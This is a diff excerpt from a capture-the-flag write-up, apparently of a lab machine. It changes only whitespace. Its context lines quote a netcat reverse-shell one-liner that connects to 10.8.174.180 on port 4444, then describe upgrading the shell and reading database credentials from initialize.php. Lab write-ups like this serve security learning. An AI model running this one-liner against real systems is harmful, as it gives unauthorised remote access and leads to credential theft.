@@ -43,7 +43,6 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.174.180 4444 >/tmp/f
 **Great!** I received a reverse connection on my port 4444. And I've upgraded the shell with pty module: 
 ![shellOpen](/images/Gallery/shellOpen.JPG)
 
-
 ## Admin’s Password Hash
 Now we're in the machine and I decided to take a look at the `initialize.php` file which gave me the username and the password for accessing the database:
 ![initial](/images/Gallery/initial.JPG)
